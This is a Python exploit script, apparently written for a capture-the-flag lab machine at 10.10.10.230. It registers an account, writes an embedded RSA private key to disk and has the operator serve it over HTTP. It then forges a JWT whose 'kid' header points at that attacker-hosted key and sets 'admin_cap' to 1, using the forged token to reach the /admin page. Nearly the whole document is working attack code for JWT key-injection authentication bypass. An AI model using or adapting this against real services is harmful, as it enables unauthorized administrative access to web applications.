#!/usr/bin/python3
import os
import requests
import base64
import jwt

ip=input("Please enter your local ip : ")
#Creating the user
print("[+]Creating the user ...")
proxy = {'http': 'http://127.0.0.1:8080'}
url = 'http://10.10.10.230/'
header_post= {'Content-Type': 'application/x-www-form-urlencoded'}
data = 'username=AbuQasem&password=1337&email=AbuQasem@Muslim.com'
req=requests.post(url+'register',data=data,headers=header_post,proxies = proxy)
if req.status_code == 200:
	print("[+]Done!")
else:
	print("Please reset the machine :)")

#Forging the cookie with my own keys:
private_key='''-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----'''

os.system(f"echo '{private_key}'> jwtRS256.key")
os.system("sleep 3")
print("[+]Please run this command in the CURRENT directory and keep it running -> python3 -m http.server")
x=input("Did you run the command? [y/n] : ")
if x == 'y':
	print("[+]Forging the token ...")
	header={"kid": f"http://{ip}:8000/jwtRS256.key"} #Adding the kid header beacuse this header is optional
	encoded = jwt.encode({"username": "AbuQasem","email": "AbuQasem@Muslim.com","admin_cap": 1}, private_key, algorithm="RS256", headers=header)
	cookie= {'auth': f'{encoded}; uuid=5da16b5f-fcde-4f1b-82ec-a9032ba0a942'}
	header_get = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}
	req2=requests.get(url+'admin',cookies=cookie,headers=header_get,proxies=proxy)
	if req2.status_code == 200 :
		print ("Login with those creds: Username= AbuQasem    Pass: 1337\n")
		print("\n\n[+]Here is your token :",encoded)
	else:
		print("Please run the script again and follow the instructions :)")